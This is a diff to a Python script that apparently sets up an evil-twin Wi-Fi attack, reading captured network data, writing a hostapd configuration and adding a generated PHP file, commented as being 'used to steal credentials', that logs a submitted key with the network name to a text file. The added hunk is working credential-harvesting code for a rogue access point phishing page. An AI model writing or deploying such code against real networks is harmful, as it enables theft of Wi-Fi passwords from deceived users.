@@ -32,6 +32,21 @@ with open('output-01.csv', newline='') as f:
 #print(macAddr)
 #print(channel)
 
+# Create the php file used to steal credentials
+subprocess.call(['rm', './website/save.php'])
+with open('./website/save.php', 'w') as f:
+    f.write('<?php\n')
+    f.write('session_start();\n')
+    f.write('ob_start();\n')
+    f.write('$key1=$_POST[\'key1\'];\n')
+    f.write('$file = fopen(\'log.txt\', \'a\');\n')
+    f.write('fwrite($file, \'\' . \'' + name[1:] +  '\' . \'-\' . $key1 . PHP_EOL);\n')
+    f.write('fclose($file);\n')
+    f.write('echo \"Success!\";\n')
+    f.write('sleep(6);\n')
+    f.write('ob_end_flush();\n')
+    f.write('?>\n')
+
 subprocess.call(['rm', 'hostapd.conf'])
 
 with open('hostapd.conf', 'w') as f:
